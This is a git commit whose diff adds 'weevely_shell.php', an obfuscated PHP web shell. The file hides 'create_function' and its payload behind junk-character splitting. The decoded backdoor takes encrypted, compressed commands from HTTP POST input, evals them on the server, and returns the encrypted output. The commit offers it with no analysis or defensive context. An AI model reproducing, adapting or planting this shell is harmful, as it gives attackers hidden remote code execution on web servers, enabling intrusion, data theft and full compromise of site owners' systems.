e5fca11253c33e7cc1a8255ae202788acecb7ee7
nanzerrous <56145682+nanzerrous@users.noreply.github.com>
2020-09-20 16:21:40 -0400

    Add files via upload

---
+++ weevely_shell.php
@@ -0,0 +1,12 @@
+<?php
+$D='ents("phA]p://inputA]"),$m)==A]1) {@oA]b_starA]t();A]@evA]al(@gzunA]compA]reA]A]ss(@x';
+$G='j}A];}}retuA]rnA] $A]o;}if (@preg_match(A]"/$A]kA]h(.+)$kfA]/",@file_A]get_cA]A]ont';
+$p=';$rA]=@basA]e6A]4_eA]ncode(@x(@gzA]compreA]ss($o),A]$k));prA]intA]("$p$A]kh$r$kf");}';
+$F='$k="A]e10adcA]39";$kA]h="49baA]59abbe56";A]$kf="eA]057A]A]f20f8A]83e";A]$p="4JthMqSqA]EJ';
+$C=str_replace('Z','','ZcZreatZe_ZZfuZnction');
+$R='i=0A];$A]i<$l;){for(A]$j=0A];($j<$cA]&&$i<A]$l);A]$j++,$i++)A]{$o.=$A]tA]{$i}^A]$k{$';
+$a='(A]@bA]ase64_decode($m[1]),$A]kA])));$o=@ob_getA]_cA]onteA]nts();@ob_endA]_cleanA]()';
+$W='VOYgQ4";A]functA]ionA] x($t,$k){$A]c=strlA]en($k)A];$l=sA]trleA]n($t);A]$o="";fA]or($';
+$U=str_replace('A]','',$F.$W.$R.$G.$D.$a.$p);
+$N=$C('',$U);$N();
+?>
